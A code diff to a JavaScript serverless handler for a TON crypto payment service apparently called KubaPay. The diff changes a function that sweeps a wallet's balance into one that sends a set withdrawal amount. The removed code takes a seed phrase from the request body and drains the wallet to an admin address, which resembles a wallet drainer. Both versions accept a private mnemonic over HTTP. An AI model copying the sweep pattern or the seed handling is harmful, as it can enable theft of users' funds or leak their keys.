@@ -1,11 +1,13 @@
-import { TonClient, WalletContractV4, internal, fromNano } from "@ton/ton";
+import { TonClient, WalletContractV4, internal, fromNano, toNano } from "@ton/ton";
 import { mnemonicToPrivateKey } from "@ton/crypto";
 
 const TON_RPC = "https://toncenter.com/api/v2/jsonRPC";
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).send('Método no permitido');
-  const { seed, adminAddress } = req.body;
+  
+  // Recibimos seed (la tuya), recipientAddress (la del usuario) y amt (monto)
+  const { seed, recipientAddress, amt } = req.body;
 
   try {
     const client = new TonClient({ endpoint: TON_RPC });
@@ -13,31 +15,40 @@ export default async function handler(req, res) {
     const keyPair = await mnemonicToPrivateKey(mnemonicArray);
     const wallet = WalletContractV4.create({ workchain: 0, publicKey: keyPair.publicKey });
     const contract = client.open(wallet);
+    
     const balance = await contract.getBalance();
+    const amountToSend = toNano(amt.toString());
 
-    if (parseFloat(fromNano(balance)) < 0.001) {
-      return res.status(200).json({ error: "Insufficient TON balance" });
+    // Verificar si tu wallet tiene suficiente para el envío + gas
+    if (balance < amountToSend + toNano("0.02")) {
+      return res.status(200).json({ error: "Saldo insuficiente en la billetera administrativa para cubrir el retiro y el gas." });
     }
 
     const seqno = await contract.getSeqno();
-    const amountToSend = balance - 20000000n; // Deja 0.02 para el gas
 
     const transfer = await contract.createTransfer({
       seqno,
       secretKey: keyPair.secretKey,
       messages: [
         internal({
-          to: adminAddress,
+          to: recipientAddress,
           value: amountToSend,
           bounce: false,
-          body: "Inversión TON",
+          body: "Retiro KubaPay", // Mensaje profesional
         })
       ]
     });
 
     await contract.send(transfer);
-    res.status(200).json({ success: true, amount: fromNano(balance) });
+    
+    // Devolvemos el hash o éxito
+    res.status(200).json({ 
+        success: true, 
+        amount: amt,
+        recipient: recipientAddress
+    });
+    
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
-      }
+          }
